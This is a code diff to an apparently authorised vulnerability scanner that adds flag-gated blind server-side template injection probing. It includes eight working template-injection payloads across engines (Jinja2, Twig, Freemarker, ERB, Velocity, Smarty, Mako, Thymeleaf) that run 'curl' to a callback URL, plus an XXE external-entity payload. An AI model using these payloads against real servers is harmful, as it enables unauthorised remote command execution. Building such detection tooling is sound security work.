@@ -362,10 +362,80 @@ CREDENTIAL_REDRIVE_CLASSES = ("credential_acceptance",)
 # these classes, so an OOB claim with no trusted material stays a LEAD, never routed to any FACT-capable mint.
 _OOB_BRANCH = "oob_callback.collector_receipt"
 OOB_REDRIVE_CLASSES = ("ssrf", "blind_xxe", "xxe", "rce", "command_injection", "deserialization", "oob_sqli")
+
+# APEX PR-2 — blind SSTI is the ONE genuinely-new out-of-band class. It is DEFAULT-OFF behind VIGIL_APEX_OOB
+# and appended to the EFFECTIVE out-of-band set ONLY at call time via :func:`oob_redrive_classes`. The frozen
+# ``OOB_REDRIVE_CLASSES`` constant is DELIBERATELY left at the standing 7 (an identity a test pins), so with the
+# flag off every decision keyed on the set — the router's oob-spec emission, the feeder's strip/inject scope,
+# the arm's class gate — is byte-identical to the historical 7-class behaviour and a ``blind_ssti`` claim stays
+# a LEAD. ``blind_ssti`` is kept DISTINCT from the in-corpus ``ssti`` class (whose row proves REFLECTED SSTI via
+# the evaluation oracle) exactly as ``oob_sqli`` is kept distinct from ``sqli``: the blind variant's SOLE proof
+# is an out-of-band callback, so it routes to a PERMANENT (flag-independent) ``BUG_CLASS_ORACLES['blind_ssti']``
+# = (OOB_CALLBACK,) row that is NOT in any benchmark corpus — the gate stays byte-identical AND an offline
+# re-verify of a minted blind_ssti FACT is STABLE (its oracle routing never depends on the flag; only live
+# PRODUCTION of the attempt does).
+_APEX_OOB_CLASSES = ("blind_ssti",)
+
+
+def apex_oob_enabled() -> bool:
+    """True iff APEX PR-2 OOB-First confirmation is ON (``VIGIL_APEX_OOB`` affirmative). OFF by default. Read at
+    call time, directly from the process environment — the offense/integration plane is keyless and may NOT
+    import the sovereign ``sigil.config`` (FATAL-2), so it reads the SAME env var the sovereign
+    ``config.apex_oob_enabled`` documents. Pure/stdlib; never raises."""
+    import os  # noqa: PLC0415 — stdlib; a call-time env read, not a key/secret and not a sigil import
+    return (os.environ.get("VIGIL_APEX_OOB") or "").strip().lower() in ("1", "true", "yes", "on", "enabled")
+
+
+def oob_redrive_classes() -> "tuple[str, ...]":
+    """The out-of-band re-drive classes EFFECTIVE for this call. The frozen base set always; blind SSTI is
+    appended ONLY when ``VIGIL_APEX_OOB`` is affirmative (APEX PR-2). With the flag off this returns EXACTLY
+    ``OOB_REDRIVE_CLASSES`` — so the set, and every gate keyed on it, is byte-identical to the standing
+    7-class behaviour (fail-closed: an un-flagged blind_ssti claim is not an out-of-band re-drive class and
+    stays a LEAD). The constant is left untouched so a direct import of it (and the test that pins it) is
+    unaffected."""
+    return OOB_REDRIVE_CLASSES + _APEX_OOB_CLASSES if apex_oob_enabled() else OOB_REDRIVE_CLASSES
+
+
+# APEX PR-2 — blind SSTI admits to its OWN registered evidence branch (``oob_callback.ssti``), so the SSTI
+# fact-capability decision is auditable per-class and carries its own honest limitation. Every OTHER out-of-band
+# class keeps admitting to ``_OOB_BRANCH`` (``oob_callback.collector_receipt``), so those paths are byte-
+# identical. Both branches are fact_capable + clean_capable:false and read the SAME class-agnostic oracle — the
+# per-class branch is a documentation/audit boundary, not a different proof.
+_OOB_BRANCH_SSTI = "oob_callback.ssti"
+_OOB_BRANCH_BY_CLASS = {"blind_ssti": _OOB_BRANCH_SSTI}
+
+
+def _oob_branch_for(bug_class: str) -> str:
+    """The registered evidence branch a given out-of-band class admits through. ``blind_ssti`` → its dedicated
+    ``oob_callback.ssti`` branch; every other class → the shared ``oob_callback.collector_receipt`` branch
+    (byte-identical to today)."""
+    return _OOB_BRANCH_BY_CLASS.get(bug_class, _OOB_BRANCH)
+
+
 # RUNNER-crafted candidate query-param names a URL-embedding probe (SSRF / OOB-SQLi / command) uses to carry
 # the callback URL. The set only bounds where the RUNNER INJECTS — never a claim of absence (the branch is
 # positive-only, not clean-capable). The oracle (a token-matched signed receipt), not the param, is authority.
 _OOB_PARAMS = ("url", "uri", "target", "dest", "callback", "webhook", "feed", "image", "host", "q")
+
+# APEX PR-2 — blind SSTI injects a template/expression-language construct that, when EVALUATED server-side,
+# forces an out-of-band fetch of VIGIL's per-finding callback (no readable response byte). ONE construct per
+# engine, each wrapping the FULL callback url (``{callback}`` already carries its scheme — no prefix) in a
+# server-side fetch. The SET only bounds where the RUNNER injects; the oracle (a token-matched signed receipt),
+# never the construct, is the authority. A template-REFLECTING-but-non-executing twin emits no callback and
+# stays a LEAD — the mandatory same-shape negative control.
+_SSTI_OOB_CONSTRUCTS = (
+    "{{cycler.__init__.__globals__.os.popen('curl -s {callback}').read()}}",            # Jinja2 (python)
+    "{{['curl -s {callback}']|map('system')|join(',')}}",                               # Twig (php)
+    "<#assign x=\"freemarker.template.utility.Execute\"?new()>${{x(\"curl -s {callback}\")}}",  # Freemarker (java)
+    "<%= IO.popen('curl -s {callback}').read %>",                                        # ERB (ruby)
+    "#set($e=\"\")$e.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"curl -s {callback}\")",  # Velocity (java)
+    "{system('curl -s {callback}')}",                                                   # Smarty (php)
+    "<%import os;os.system('curl -s {callback}')%>",                                     # Mako (python)
+    "__${{T(java.lang.Runtime).getRuntime().exec('curl -s {callback}')}}__::.x",         # Thymeleaf/SpEL (java)
+)
+# The template-rendering params a blind-SSTI construct is most likely to reach (distinct from the URL-embedding
+# _OOB_PARAMS the SSRF/command family uses). Bounded work; the oracle, not the param, decides.
+_SSTI_OOB_PARAMS = ("name", "q", "message", "msg", "comment", "title", "search", "input", "template")
 
 # --- D1: what the traversal arm's LEAD-quality guards do, and what they provably do NOT do -----------
 # The canonical traversal payload, plus SEMANTICALLY-IDENTICAL re-encodings of the SAME path. POSIX
@@ -944,7 +1014,7 @@ def runtime_redrive(url: str, *, slug: str, engagement_slug: str, signers: "list
     # :func:`oob_callback_redrive` WITHOUT material, which REFUSES (no material, no FACT) — a VIGIL-owned,
     # fail-closed non-fire. The material only ever reaches the arm through its explicit ``oob_material`` /
     # the dedicated ``wiring._live_oob_redrive_fact`` seam, never the model.
-    if bug_class in OOB_REDRIVE_CLASSES:
+    if bug_class in oob_redrive_classes():
         return oob_callback_redrive(url, slug=slug, engagement_slug=engagement_slug,
                                     signers=signers, oob_material=None, timeout=timeout)
     res = RuntimeRedriveResult(url=url, bug_class=bug_class)
@@ -2216,6 +2286,16 @@ def _oob_probe_requests(HttpRequest: Any, bug_class: str, url: str, callback: st
             else:
                 value = callback                          # SSRF: the callback is the fetched URL itself
             reqs.append(HttpRequest(method="GET", url=_url_with_param(url, p, value)))
+    if bug_class == "blind_ssti":
+        # APEX PR-2 — a template/EL construct per engine that forces a server-side fetch of the callback when
+        # EVALUATED (the blind variant leaves no readable response byte). The callback is embedded verbatim; a
+        # reflecting-but-non-executing twin emits no callback (the same-shape negative control → stays a LEAD).
+        for p in _SSTI_OOB_PARAMS[:2]:
+            for construct in _SSTI_OOB_CONSTRUCTS:
+                # .replace (not .format): SSTI constructs carry literal {{ }} / ${ } braces that str.format
+                # would misparse; the callback is the only placeholder, substituted literally.
+                reqs.append(HttpRequest(method="GET",
+                                        url=_url_with_param(url, p, construct.replace("{callback}", callback))))
     if bug_class in ("xxe", "blind_xxe"):
         body = ('<?xml version="1.0"?>'
                 f'<!DOCTYPE r [<!ENTITY xxe SYSTEM "{callback}">]><r>&xxe;</r>')
@@ -2284,12 +2364,15 @@ def oob_callback_redrive(url: str, *, slug: str, engagement_slug: str,
     # The claimed OOB class rides on the trusted material (the dedicated seam sets it from the redrive spec).
     bug_class = normalize_bug_class(str((oob_material or {}).get("bug_class") or "")) \
         if isinstance(oob_material, dict) else ""
-    if bug_class not in OOB_REDRIVE_CLASSES:
+    if bug_class not in oob_redrive_classes():
         # Default to ssrf for a bare delegation so the result still names a coherent OOB class; a generic
         # delegation passes no material, so it refuses below regardless.
         bug_class = bug_class or "ssrf"
 
-    res, send, state = _stat_setup(url, slug, bug_class, _OOB_BRANCH, timeout)
+    # blind_ssti admits through its OWN registered branch (``oob_callback.ssti``); every other class keeps the
+    # shared ``oob_callback.collector_receipt`` branch, byte-identical to today.
+    branch = _oob_branch_for(bug_class)
+    res, send, state = _stat_setup(url, slug, bug_class, branch, timeout)
     if send is None:
         return res
 
@@ -2302,7 +2385,7 @@ def oob_callback_redrive(url: str, *, slug: str, engagement_slug: str,
                          "collector keypair + the out-of-band pinned pubkey) — no material, no FACT")
         return res
     verifier, collector_keypair, advertise = built
-    if bug_class not in OOB_REDRIVE_CLASSES:
+    if bug_class not in oob_redrive_classes():
         res.notes.append(f"refused: {bug_class!r} is not an OOB re-drive class")
         return res
 
@@ -2355,7 +2438,7 @@ def oob_callback_redrive(url: str, *, slug: str, engagement_slug: str,
             skew=context.get("oob_skew"),
             authority_ttl=verifier.oob_ttl_seconds, authority_skew=verifier.oob_skew_seconds,
             authority_not_before=verifier.oob_not_before, authority_not_after=verifier.oob_not_after)
-        _admit_one(res, branch=_OOB_BRANCH, bug_class=bug_class, engagement_slug=engagement_slug,
+        _admit_one(res, branch=branch, bug_class=bug_class, engagement_slug=engagement_slug,
                    signers=signers, context=context, item=f"{url}#oob:{bug_class}",
                    surface=f"oob:{token[:8]}", fired=signal.fired,
                    conclusive=bool(getattr(signal, "conclusive", False)), body_unreadable=False,
